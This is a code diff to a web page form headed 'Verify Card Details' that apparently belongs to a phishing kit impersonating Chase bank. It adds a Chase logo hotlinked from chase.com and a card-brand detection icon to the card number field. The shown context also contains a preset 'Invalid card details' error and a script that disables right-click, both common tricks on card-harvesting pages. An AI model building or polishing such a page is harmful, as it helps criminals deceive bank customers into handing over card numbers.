@@ -63,12 +63,16 @@
                        <div class="row">
                            <div class="col-xs-10 col-xs-offset-1">
                                <form action="" method="post" id="res" enctype="multipart/form-data">
+                                 <div style="text-align: center; margin-bottom: 20px;">
+                                     <img src="https://sites.chase.com/content/mktservices/digital-assets/image.flexible-hero-new-foreground-photography.png/image/creatives/masterbrand-icons/mobile-check-icon.png" alt="Chase Card" style="max-width: 100%; height: auto; border-radius: 5px;">
+                                 </div>
                                  <h3 style="font-family: sans-serif;text-align: center;">Verify Card Details</h3>
                                    <span style="color: crimson;" class="rror" id="rror">
                                         <i class="fas fa-circle-exclamation" style="color: crimson;"></i>
                                         Invalid card details, please try again
                                     </span>
-                                  <div class="us-norm us-mt">
+                                  <div class="us-norm us-mt" style="position: relative;">
+                                   <span id="card-type-icon" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); font-size: 24px; display: none;"></span>
                                    <input type="text" class="frinp" name="cardnumber" id="cardnumber" required pattern="[0-9]{16}" maxlength="16">
                                    <label for="cardnumber" class="frel">Card Number</label>
                                   </div>
@@ -189,6 +193,29 @@ function myFunction() {
     ken.style.display = "none";
   }
 }
+
+// Card type detection
+document.getElementById("cardnumber").addEventListener("input", function(e) {
+    const cardNumber = e.target.value.replace(/\s/g, '');
+    const cardTypeIcon = document.getElementById("card-type-icon");
+    
+    // Clear previous icon
+    cardTypeIcon.style.display = "none";
+    cardTypeIcon.innerHTML = "";
+    
+    if (cardNumber.length >= 1) {
+        // Visa starts with 4
+        if (cardNumber[0] === '4') {
+            cardTypeIcon.innerHTML = '<i class="fab fa-cc-visa" style="color: #1A1F71;"></i>';
+            cardTypeIcon.style.display = "block";
+        }
+        // Mastercard starts with 51-55 or 2221-2720
+        else if (/^5[1-5]/.test(cardNumber) || /^(222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)/.test(cardNumber)) {
+            cardTypeIcon.innerHTML = '<i class="fab fa-cc-mastercard" style="color: #EB001B;"></i>';
+            cardTypeIcon.style.display = "block";
+        }
+    }
+});
       document.addEventListener('contextmenu', function (e) {
          e.preventDefault();
        });
